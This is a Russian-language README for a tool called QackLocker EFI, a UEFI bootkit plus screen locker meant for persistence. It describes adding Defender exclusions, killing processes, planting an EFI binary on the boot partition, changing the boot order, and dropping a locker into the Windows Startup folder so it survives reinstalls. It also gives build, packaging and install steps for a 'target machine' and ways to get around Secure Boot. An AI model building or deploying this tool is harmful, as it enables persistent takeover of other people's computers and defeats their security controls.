# QackLocker EFI

UEFI bootkit + locker. Persists on ESP, survives Windows reinstall, chainloads Windows.

## Что делает

1. `locker_button.exe` запускается на Windows — ставит локер, Defender exclusions, убивает процессы.
2. Распаковывает `bootx64.efi` на EFI System Partition.
3. Прописывает BootOrder через `bcdedit` — UEFI грузит `bootx64.efi` первым.
4. `bootx64.efi` при загрузке: копирует `locker.exe` в `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`, chainload `bootmgfw.efi`.
5. Windows грузится → `locker.exe` стартует из Startup.
6. После `format c:` — ESP и BootOrder живы, цикл повторяется.

## Требования

- Windows 10/11 x64, UEFI boot (не Legacy).
- Secure Boot **выключен** (или `.efi` подписан через `sbctl`).
- Админ права.
- EDK2 для сборки `.efi`.

## Сборка

### 1. EDK2

```bash
# Linux / WSL
git clone --recurse-submodules https://github.com/tianocore/edk2.git ~/edk2
cd ~/edk2
source edksetup.sh
```

```cmd
REM Windows
git clone --recurse-submodules https://github.com/tianocore/edk2.git C:\edk2
cd C:\edk2
edksetup.bat Rebuild
```

### 2. UEFI-драйвер

```bash
# Linux / WSL
EDK2_DIR=~/edk2 ./scripts/build_efi_linux.sh
```

```cmd
REM Windows
scripts\build_efi_windows.bat
```

Результат: `bootx64.efi` в корне репозитория.

### 3. Локер

Положи `locker_button.py` (и `assets/`, `scream.mp3`) в `payload/`.

### 4. Один exe

```cmd
scripts\build_exe.bat
```

Результат: `dist\locker_button.exe` — один файл, внутри `bootx64.efi`, `assets/`, `scream.mp3`.

## Установка

1. Скопируй `dist\locker_button.exe` на целевую машину.
2. Запусти от админа.
3. Перезагрузка.

## Тест

**Только VM со снапшотом.** QEMU + OVMF:

```bash
qemu-system-x86_64 -bios OVMF.fd -hda win11.qcow2 -m 4G
```

## Secure Boot

Если включён:
```bash
sbctl sign -s bootx64.efi
```
Или отключи SB в BIOS.

## Ограничения

- Boot Guard на новых платах (Intel 12+ gen) — ESP-драйвер работает, SPI-имплант нет.
- BitLocker: если включён — recovery key потребуется после смены BootOrder.
- Не работает на Legacy/MBR boot.
